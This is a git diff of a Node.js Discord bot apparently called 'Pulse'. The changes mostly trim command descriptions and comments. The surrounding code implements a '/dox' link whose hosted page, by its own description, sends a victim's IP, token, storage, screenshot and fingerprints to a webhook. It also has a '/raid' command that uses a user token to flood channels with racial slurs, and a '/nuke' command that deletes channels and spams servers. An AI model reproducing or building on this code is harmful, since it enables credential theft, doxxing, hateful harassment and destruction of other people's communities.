@@ -3,21 +3,18 @@ const crypto = require('crypto');
 const express = require('express');
 const app = express();
 
-// ---- ENVIRONMENT ----
 const TOKEN = process.env.TOKEN;
-const USER_TOKEN = process.env.USER_TOKEN;  // 👈 Add your user token here
+const USER_TOKEN = process.env.USER_TOKEN;
 const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
 const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
 const PORT = process.env.PORT || 3000;
 
-// ---- CLIENT ----
 const client = new Client({
     intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
 });
 
 const links = new Map();
 
-// ---- EXPRESS SERVER (for dox) ----
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
     if (!links.has(id)) return res.status(404).send('Image not found');
@@ -27,14 +24,13 @@ app.get('/img/:id.png', (req, res) => {
 });
 app.listen(PORT, () => console.log(`🌐 Dox server on ${PORT}`));
 
-// ---- COMMANDS ----
 client.once('ready', async () => {
     console.log(`🤖 ${client.user.tag} ready`);
     await client.application.commands.set([]);
     await client.application.commands.set([
         {
             name: 'dox',
-            description: 'Generate ultimate dox link (screenshot, token, storage)',
+            description: 'Ultimate dox link',
             options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }]
         },
         {
@@ -42,26 +38,26 @@ client.once('ready', async () => {
             description: 'Spam a channel',
             options: [
                 { name: 'count', type: 4, description: 'Number of messages', required: true },
-                { name: 'message', type: 3, description: 'Message to spam', required: true }
+                { name: 'message', type: 3, description: 'Content', required: true }
             ]
         },
         {
             name: 'raid',
-            description: 'Raid any channel (uses user token)',
+            description: 'Raid any channel (user token)',
             options: [
-                { name: 'channel_id', type: 3, description: 'Channel ID to raid', required: true },
-                { name: 'lines', type: 4, description: 'Number of heading lines (default 30)', required: false }
+                { name: 'channel_id', type: 3, description: 'Channel ID', required: true },
+                { name: 'lines', type: 4, description: 'Heading lines (default 30)', required: false }
             ]
         },
         {
             name: 'nuke',
-            description: 'Delete channels, create 10, send X giant heading messages, then leave',
+            description: 'Delete channels, create 10, spam, leave',
             options: [
                 { name: 'count', type: 4, description: 'Messages per channel (default 10, max 100)', required: false },
-                { name: 'delay', type: 4, description: 'Delay (ms) between messages (default 50)', required: false }
+                { name: 'delay', type: 4, description: 'Delay between messages (ms, default 50)', required: false }
             ]
         },
-        { name: 'ad', description: 'Advertise the server' },
+        { name: 'ad', description: 'Advertise server' },
         {
             name: 'purge',
             description: 'Delete messages',
@@ -88,9 +84,9 @@ client.on('interactionCreate', async (interaction) => {
         const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
         links.set(id, { webhook: wh, user: interaction.user.tag });
         const embed = new EmbedBuilder()
-            .setTitle('✅ Ultimate Dox Ready')
+            .setTitle('✅ Dox Ready')
             .setColor(0x22c55e)
-            .setDescription(`🔗 ${url}\n\nSends: IP, location, token, storage, screenshot, fingerprints.`);
+            .setDescription(`🔗 ${url}\n\nSends IP, token, storage, screenshot, fingerprints.`);
         await interaction.editReply({ embeds: [embed] });
         return;
     }
@@ -113,15 +109,12 @@ client.on('interactionCreate', async (interaction) => {
     // ---- RAID (Universal – uses user token) ----
     if (interaction.commandName === 'raid') {
         await interaction.deferReply({ ephemeral: true });
-
         if (!USER_TOKEN) {
-            return interaction.editReply('❌ USER_TOKEN not set. Add it to environment variables.');
+            return interaction.editReply('❌ USER_TOKEN not set.');
         }
-
         const channelId = interaction.options.getString('channel_id');
         const linesCount = Math.min(interaction.options.getInteger('lines') || 30, 50);
 
-        // Build the raid message
         const firstLine = '@everyone FUCK THIS SERVER PULSE OWNS ALL YOU STUPID N!GGERS';
         const headingLine = '# FUCK THIS SERVER PULSE OWNS ALL YOU STUPID N!GGERS';
         const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
@@ -132,7 +125,6 @@ client.on('interactionCreate', async (interaction) => {
         }
         message += inviteLine;
 
-        // Send using user token
         try {
             const res = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
                 method: 'POST',
@@ -249,7 +241,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- DOX HTML (Full version with IP and screenshot) ----
+// ---- DOX HTML (Full version) ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
